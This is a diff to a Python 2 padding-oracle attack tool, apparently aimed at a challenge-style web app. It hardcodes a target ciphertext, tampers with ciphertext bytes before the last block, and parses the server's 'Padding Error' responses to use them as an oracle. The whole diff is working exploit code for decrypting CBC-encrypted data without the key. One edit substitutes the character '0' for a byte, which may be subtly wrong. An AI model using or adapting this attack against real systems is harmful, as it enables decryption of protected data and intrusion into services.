@@ -9,6 +9,16 @@ from leak.leak import HTTPLeaker
 #logging.basicConfig()
 
 
+def hexify(msg):
+    return ''.join(['%02x' % ord(_) for _ in msg])
+
+def dehexify(msg):
+    return ''.join([chr(int(msg[2*_:2*(_ + 1)], 16)) for _ in xrange(0, len(msg)/2)])
+
+def xor(a, b):
+    return chr(ord(a)^ord(b))
+
+
 class RedPillsParser(RegexParser):
     def __init__(self):
         super(RedPillsParser, self).__init__(pattern=r'.*((?P<success><h2>Home</h2>)|(?P<file><h2>File not found</h2>)|(?P<padding_error><h2>Server Error: Padding Error</h2>).*)')
@@ -22,8 +32,10 @@ class CBCPaddingOracle(HTTPLeaker):
     def __init__(self, **kwargs):
         super(CBCPaddingOracle, self).__init__(parser=RedPillsParser(), **kwargs)
 
+        self.ciphertext = dehexify('E5D68870EB5626D54D4F12F2A5EA2F80550CF3C11CF45ED978C5CD8155724490')
+
         self.state.update({
-            'original_ciphertext': 'E5D68870EB5626D54D4F12F2A5EA2F80550CF3C11CF45ED978C5CD8155724490',
+            'original_ciphertext': self.ciphertext,
             #'original_ciphertext': '78152889BDF27A930F14742DBB54A6DECE87A24713B30B76987D2A87DD9D6C52FA1A6B697D62000332F435B99D8371DD', # about us
             'block_length': 16,
             'state': self.State.ORIGINAL_PADDING_FINDING,
@@ -66,7 +78,7 @@ class CBCPaddingOracle(HTTPLeaker):
 
     @property
     def blocks_number(self):
-        return len(self.state['original_ciphertext'])/self.state['block_length']/2 # FIXME: write internally as byte
+        return len(self.state['original_ciphertext'])/self.state['block_length']
 
     def block_offset(self, n):
         assert n >= 0
@@ -81,11 +93,11 @@ class CBCPaddingOracle(HTTPLeaker):
         if self.state['state'] == self.State.ORIGINAL_PADDING_FINDING:
             # first of all we find the offset of the block before the last
             #import ipdb;ipdb.set_trace()
-            idx = (self.block_offset(self.blocks_number - 2) + self.state['idx']) * 2
-            ciphertext= ciphertext[:idx] + '00' + ciphertext[idx + 2:]
+            idx = (self.block_offset(self.blocks_number - 2) + self.state['idx'])
+            ciphertext= ciphertext[:idx] + '0' + ciphertext[idx + 1:]
 
         return {
-            'c': ciphertext,
+            'c': hexify(ciphertext),
         }
 
     def get_requests_url(self):
